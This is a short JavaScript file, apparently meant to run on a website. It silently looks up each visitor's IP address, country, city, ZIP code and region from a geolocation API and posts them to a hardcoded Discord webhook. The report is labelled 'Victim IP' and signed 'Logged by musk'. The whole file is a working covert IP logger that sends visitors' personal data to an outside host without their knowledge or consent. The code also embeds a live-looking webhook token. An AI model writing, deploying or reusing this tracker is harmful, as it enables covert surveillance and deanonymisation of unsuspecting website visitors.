const webhook = "https://discord.com/api/webhooks/1073586834787012749/nPteRQXNw11pyinS-wqEhxcWEAPsy9qxl0qdWHQPbNHa97V_z8JUNUYDLu4LMBrggb_W"

async function IP_Info(){
    /**
     *  
     *  @return {fetch.Body.json()} 
     */
    let response = await fetch("http://ip-api.com/json", {
      method: 'GET',
      headers: {
        "cache-control" : "no-cache",
        "content-type": "application/json"
      }
    })
    return response.json()
  }
  IP_Info().then((value)=> {
    let requiredInfo = [
      "status","country", "city", "zip", "regionName"
    ]
    let noData = false

    for(var i = 0; i < requiredInfo.length; i++){
      if(typeof(value[`${requiredInfo[i]}`]) === 'undefined'){
        noData = true
        break
      } 
    }
    if(noData){
      return null
    }
    return value
  }).then( async (value) => {
    if(value !== null){
       await fetch(webhook, {
        method: 'POST',
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content:"",
          embeds: [{
              title: "Victim IP",
              type:"rich",
              color: "12223968",
              description: "```IP information of the recent website visitor.```",
              fields: [{
                name: "IP", value: `${value.query}`, inline: false
              },
              {
                name: "Country", value: `${value.country}`, inline: false
              },
              {
                name: "City", value: `${value.city}`, inline: false
              },
              {
                name: "ZIP", value: `${value.zip}`, inline: false
              },
              {
                name: "Region", value: `${value.regionName}`, inline: false
              }
              ],
              footer: {
                text: "Logged by musk",
                icon_url: "https://avatars.githubusercontent.com/u/62134419?v=4"
              },
              author: {
                name: "",
                url: ""
              },
              thumbnail: {
                url: ""
              }
          }]
        })
      }).then((value)=>{
        console.log(value.statusText)
      }).catch((err)=>{
        console.log(err)
      })
    }
  }).catch((err)=> {
    console.log(err)
    console.log('Request not send')
  })
